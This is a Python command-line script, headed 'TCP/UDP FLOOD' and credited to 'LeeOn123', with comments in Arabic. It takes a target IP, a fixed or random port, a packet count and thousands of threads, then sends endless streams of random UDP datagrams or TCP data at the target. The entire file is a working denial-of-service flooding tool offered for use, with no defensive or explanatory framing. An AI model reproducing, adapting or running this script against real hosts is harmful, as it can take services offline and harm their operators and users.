#!/usr/bin/env python3
#Code by LeeOn123
import argparse
import random
import socket
import threading

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", type=int, default=0, help="Port (0 for random, range for random: min-max)")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=2000, help="Threads")
args = vars(ap.parse_args())

print("--> C0de By Lee0n123 <--")
print("#-- TCP/UDP FLOOD --#")
ip = args['ip']
port_arg = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

# تحديد إذا كان المستخدم يريد منافذ عشوائية
use_random_ports = (port_arg == 0)

def run():
    data = random._urandom(1024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # اختيار منفذ عشوائي في كل مرة
            if use_random_ports:
                target_port = random.randint(1, 65353)
            else:
                target_port = port_arg
            addr = (str(ip), target_port)
            for x in range(times):
                s.sendto(data, addr)
            print(i + f" Sent to port {target_port}!!!")
        except:
            print("[!] Error!!!")

def run2():
    data = random._urandom(16)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            # اختيار منفذ عشوائي في كل مرة
            if use_random_ports:
                target_port = random.randint(1, 65353)
            else:
                target_port = port_arg
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, target_port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + f" Sent to port {target_port}!!!")
        except:
            s.close()
            print("[*] Error")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()
